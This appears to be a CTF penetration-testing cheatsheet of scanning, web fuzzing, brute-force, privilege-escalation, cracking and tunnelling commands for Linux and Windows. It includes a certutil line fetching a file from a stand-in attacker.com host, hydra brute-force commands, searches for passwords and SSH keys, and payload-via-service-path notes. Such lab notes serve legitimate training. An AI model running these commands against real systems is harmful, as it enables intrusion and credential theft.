# CTF Cheatsheet

1. [Enumeration and Exploitation](#enumeration-and-exploitation)
1. [Linux Privilege Escalation](#linux-privilege-escalation)
1. [Windows Privilege Escalation](#windows-privilege-escalation)
1. [Miscellaneous](#miscellaneous)

## Enumeration and Exploitation

+ Scanning:

  Start with a TCP scan; if you do not get anything from footprinting the services found, then only go for a UDP scan since it is time-consuming.

  ```sh
  nmap -T4 -p- -A -Pn -v target.com
  # TCP scan

  sudo nmap -sU -Pn -v target.com
  # scan only top UDP ports, unless you have a lot of time to kill

  # we can also check with alt scanning tools like nikto
  nikto -h target.com

  # if we want to check on a network level
  netdiscover -r 10.0.2.0/24
  ```

+ Service [footprinting](https://github.com/SrivathsanNayak/ethical-hacking-notes/blob/main/HTBAcademy/Footprinting/README.md):

  Based on whatever ports & services are there; consider enumerating manually as well as using automated tools. Also, search for found ports and services - it could be associated with a known vulnerable service/version

+ Clues:

  Look for certain clues and hints in the challenge statement itself. For example, if the word 'knock' is mentioned, it would refer to ```knock``` as in [port knocking](https://d00mfist.gitbooks.io/ctf/content/port_knocking.html), after which we will have to re-scan the machine.

+ Web enumeration:

  As with anything else, do not leave any stone unturned. Check everything, and do not assume anything. For any check, use multiple wordlists and multiple tools.

  For manual enumeration, always check the following at least:

  + 'Inspect' and 'View Page Source' - check all tabs in Inspect part, and source code thoroughly for any clues

  + Input fields - for any field which takes user input, test it with all possible payloads to check for all types of web attacks like SQLi, XSS, XXE, LFI, etc.

  + Login forms - same as above; check for all payloads imaginable, use multiple wordlists. Common attacks in login forms include SQLi, NoSQLi, null byte injection, etc; if needed, we can use tools such as ```sqlmap```

  + Burp Suite - if going nowhere, take a tour of the webpages but with Intercept enabled; helpful for any redirects or hints

  + SSL certificate - in a few cases, viewing the certificate gives us extra information like usernames, email addresses, subdomains, etc.

  + File info - for any files encountered, check if it has any secret data or any other use; some files need to be checked by hexdump tools to view the magic numbers, or they might have embedded files.

  + Technologies used and their versions - this can lead us to known exploits; research extensively on platforms such as Google, ExploitDB and Metasploit.

  + Parameter fuzzing - various wordlists can be used for fuzzing parameters using tools like ```ffuf```

  + Weak/default credentials - for any login page, make sure you try default or weak creds first before proceeding with any bruteforce attempt

  + Bruteforce - if you really need to use ```hydra``` to bruteforce basic authentication or login form, for example, then make sure you know the username(s) and for passwords you can use rockyou.txt; in case usernames are not given, choose a few common usernames or based on the challenge, and in addition to that generate a wordlist from the website using ```cewl```

    ```sh
    gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg -t 25
    # directory scan - this is not recursive to save time
    # if any directories found, recursively scan those directories in another command

    # if recursive scanning is really required
    feroxbuster -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,bak,js,txt,json,docx,pdf,zip,cgi,sh,pl,aspx,sql,xml --extract-links --scan-limit 2 --filter-status 400,401,404,405,500 --silent
    
    # use multiple wordlists - when checking again, start with smaller wordlists like 'common.txt' and then go for bigger ones
    # and if that does not give anything, use another tool like ffuf for directory scanning
    # additionally, scan directories which provide directory listing as well - things can be hidden from us

    ffuf -u https://target.com/folder/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s
    # directory scanning using ffuf

    ffuf -c -u "http://target.com" -H "Host: FUZZ.target.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 10005 -s
    # subdomain enumeration, filter false positives
    # similar to the above, always check with multiple wordlists and multiple tools

    gobuster vhost -u http://target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
    # vhost enumeration

    sudo wfuzz -c -f sub-fighter -u "http://target.com" -H "Host: FUZZ.target.com" -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50
    # alt tool for subdomain enum

    ffuf -w /usr/share/seclists/Fuzzing/UnixAttacks.fuzzdb.txt -u "http://target.com/index.php?referer=FUZZ" -fw 1680
    # parameter fuzzing

    wfuzz -u http://target.com/dashboard.php?FUZZ=ls+-la -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt --hw 0
    # parameter fuzzing can also check for RCE

    wfuzz -v -c -z file,/usr/share/wordlists/rockyou.txt -d "{"username":"admin","password":"FUZZ"}" --hw 42 http://target.com/api/login
    # web bruteforce using wfuzz - hydra can also be used
    ```

## Linux Privilege Escalation

  ```linpeas.sh``` is a good starting point - go through everything listed in its output. But in case you are not getting anything, manual checks will help:

  ```sh
  id
  # check which groups you are part of - some groups have more permissions

  ls -la
  # search all files in home directory and go through them
  # tip - use the 'file' command to quickly check what type of file it is - if it is of use, we can transfer it to our machine

  ls -la /home
  # check all users
  # if possible go through their directories
  # we can have interesting folders like '.ssh' or '.mozilla'

  sudo -l
  # if we have password, check the commands we can run as root or other user/group

  history
  # check previous commands

  find / -perm -222 -type d 2>/dev/null
  # search world-writable folders

  find / -type f -iname ".*" -ls 2>/dev/null
  # search all hidden files

  find / -type f -user joe 2>/dev/null
  # search files owned by 'joe'

  find / -group userGroup 2>/dev/null
  # search files owned by 'userGroup'

  find / -type f -perm -04000 -ls 2>/dev/null
  # find files that have SUID

  grep --color=auto -rnw -iIe "PASSW\|PASSWD\|PASSWORD\|PWD" --color=always 2>/dev/null
  # check password strings

  find / -perm -u=s -type f 2>/dev/null
  # check SUID binaries - for exploits, check GTFOBins

  find / -name authorized_keys 2>/dev/null
  find / -name id_rsa 2>/dev/null
  # check for SSH keys

  cat /etc/exports
  # check for 'no_root_squash'

  # in some cases, there are unknown or offbeat SUID binaries, they should be checked first
  # run those binaries and try to understand how it works
  # see how it responds to input, certain binaries can be exploited through buffer overflow, ret2libc, etc.
  # if required, transfer to attacker machine and reverse engineer with Ghidra

  ls -la /mnt
  # check if anything is mounted

  lsblk
  # list blocks

  # for any interesting binaries or anything with a name or version attached, research for known exploits
  # linpeas would not help here, so we need to manually check

  cat /etc/crontab
  # check scheduled jobs
  
  ./pspy64
  # check processes running in background using pspy

  # also, if any interesting programs are found, like Python or Bash scripts
  # try to understand how it works and if that can be exploited
  # using methods like library hijacking, tar wildcard injection

  ls -la /etc/update-motd.d/
  # check if we have any writable banner or MOTD files

  mysql -u root -p
  # enumerate internal services such as mysql
  # with known or common passwords

  env
  # check for specific env variables set
  # like env_keep+=LD_PRELOAD

  # if there is a script to be modified
  # and we do not have write access to script but write access to directory
  # we can create another evil script in same directory and create a symbolic link

  ss -ltnp
  # check internal services for open ports
  # if unusual ports are seen here, it could be checked further

  getcap -r / 2>/dev/null
  # check capabilities

  # check if the target box is a Docker image
  # so that we can break out of it
  hostname
  # random hostname

  ls -la /
  # includes .dockerenv

  cat /proc/1/cgroup
  # includes 'docker' in paths

  # if we are in a Docker env, we can check internal ports
  # using a primitive bash port-scanner to check internal services
  # example - if we have access to MySQL DB, we can inject PHP code into table
  # and save table to file on remote system - then we can get RCE using curl

  # if pivoting into other machines in same network is required
  # we can look into sshuttle and scanning other internal hosts using a ping sweep - check THM Holo room
  ```

## Windows Privilege Escalation

  ```cmd
  whoami
  # user

  whoami /priv
  # current user privileges

  whoami /groups

  net users
  # list users

  net user Administrator
  # list user details

  qwinsta
  # other users logged in

  net localgroup
  # users groups

  net localgroup Administrators
  # list group members

  systeminfo
  # verbose output

  systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
  # shows only required info

  hostname

  gci -force
  # show hidden directories in PS

  findstr /si password *.txt
  # recursively search all directories for 'password' string in text files

  cmdkey /list
  # lists saved credentials

  runas /savecred /user:admin reverse_shell.exe
  # try credentials

  # registry keys can also contain passwords
  reg query HKLM /f password /t REG_SZ /s

  reg query HKLM /f password /t REG_SZ /s

  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
  # check for password reuse as well

  # if we have credentials for a user, test it
  evil-winrm -u "joe" -p "p@ssw0rd!" -i target.com

  # for port forwarding, we can use plink.exe

  wmic qfe get Caption,Description,HotfixID,InstalledOn
  # lists updates installed using wmic tool

  wmic logicaldisk get caption,description,providername
  # list drives

  where -R C:\Windows wsl.exe
  # search for windows subsystem for linux
  # you can also search for bash.exe

  ipconfig /all
  
  arp -a
  # check arp tables

  route print
  # check routing tables

  netstat -ano
  # lists listening ports on target system

  schtasks /query /fo LIST /v
  # lists scheduled tasks

  driverquery
  # installed drivers

  sc queryex type=service
  # service enum

  sc query windefend
  # check for Windows Defender

  netsh advfirewall firewall dump
  netsh firewall show state
  netsh firewall show config
  # firewall enumeration

  wmic product
  # prints info on product

  wmic product get name,version,vendor
  # filter output

  wmic service list brief
  # all services

  wmic service list brief | findstr "Running"
  # filter output

  sc qc service
  # prints info on service

  certutil.exe -urlcache -f http://attacker.com/winpeas.exe winpeas.exe
  # fetch file from attacker machine to target - like wget or curl

  # check for DLL hijacking vulns using ProcMon

  # check for unquoted service path vuln
  # requires permission to write to a folder on the path and to restart the service

  wmic service get name,displayname,pathname,startmode
  # check running services with unquoted paths

  sc qc unquotedsvc
  # check binary path of service

  .\accesschk64.exe /accepteula -uwdq "C:\Program Files\"
  
  # check privileges on folders in binary path and find a writable folder
  # after this, we can generate a payload using msfvenom
  # move payload to target in the correct path, setup listener, and restart service
  sc stop unquotedsvc

  sc start unquotedsvc

  # Active Directory enum

  net user /domain
  # list all users

  net user joe.bloggs /domain
  # info for particular user

  net user Guest /domain
  # info for guest account

  net group /domain
  # list all groups

  net group "Admins" /domain
  # info for group

  net accounts /domain
  # enumerate password policy

  # we can enumerate AD using PowerShell as well
  # using cmdlets like Get-ADUser, Get-ADGroup, Get-ADObject and Get-ADDomain
  # or using tools such as Sharphound/Bloodhound

  C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
  # check Autoruns for any programs - the path will differ

  reg query HKLM\Software\Policies\Microsoft\Windows\Installer
  reg query HKCU\Software\Policies\Microsoft\Windows\Installer
  # check for AlwaysInstallElevated

  Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
  # check for exploits related to regsvc

  C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
  # check for file permissions on executable files

  icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
  # check for Startup apps

  C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
  # service permissions
  ```

## Miscellaneous

+ [Steganography](https://0xrick.github.io/lists/stego/):

  Whenever you come across any image files, given the context, you can always give steganography a try; if you happen to have a password/string, you can check with tools like ```steghide```. For other types of files, like audio files, we have stego tools like ```wavsteg``` and ```Sonic Visualizer```, so you should know which tool to try for which type of file:

  ```sh
  steghide extract -sf image.jpg

  foremost -i image.jpg

  strings -n 6 image.jpg

  stegseek image.jpg /usr/share/wordlists/rockyou.txt
  # check if it is using common passwords

  exiftool image.jpg

  binwalk --dd='.*' image.jpg

  zsteg -a test.png
  ```

+ Cryptography:

  For any text that you cannot understand or decode, it could be encoded/encrypted, and sometimes in multiple layers. Check with the following tools:

  + [CyberChef](https://gchq.github.io/CyberChef/) - check with all recipes
  + [dCode](https://www.dcode.fr/en) - can be used to identify cipher used; also browse for all tools as it contains a lot of esoteric languages

+ Bruteforce:

  ```hydra``` can be used for bruteforcing for multiple services:

  ```sh
  hydra -l joe -P pwd.lst ssh://target.com

  hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt target.com ftp

  crunch 4 4 -t "s@@@" -o pwd.lst
  # if we have a known pattern of password

  cewl -d 5 -m 8 -e http://target.com -w wordlist.txt
  # generate wordlist from website
  # -d for spidering depth, and -m for minimum wordlength
  ```

+ Cracking tools:

  + ```ssh2john```:

    ```sh
    ssh2john id_rsa > hash_id_rsa

    john --wordlist=/usr/share/wordlists/rockyou.txt hash_id_rsa
    ```
  
  + ```zip2john```:

    ```sh
    zip2john backups.zip > ziphash.txt

    john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt
    ```
  
  + ```gpg2john```:

    ```sh
    gpg2john private.asc > asc_hash

    john --wordlist=/usr/share/wordlists/rockyou.txt asc_hash
    ```
  
  + ```hashcat```:

    ```sh
    hashcat -a 0 -m 1600 apachehash.txt /usr/share/wordlists/rockyou.txt
    ```
  
+ SSH tunnelling:

  ```sh
  ssh joe@target.com -i id_rsa -D 1337
  # setup dynamic port forwarding

  # in attacker machine, setup port forwarding
  vim /etc/proxychains.conf

  # comment out 'socks4 127.0.0.1 9050' at end of config
  # and add 'socks5 127.0.0.1 1337'

  # use proxychains to enumerate internal ports on target machine
  # command to be run on attacker machine
  proxychains nmap -sT 127.0.0.1

  # perform local port forwarding, to port 80, using -L
  # after this we will be able to access service, which is running on target server port 80, on our attacker machine port 4444
  ssh joe@target.com -i id_rsa -L 4444:127.0.0.1:80
  ```
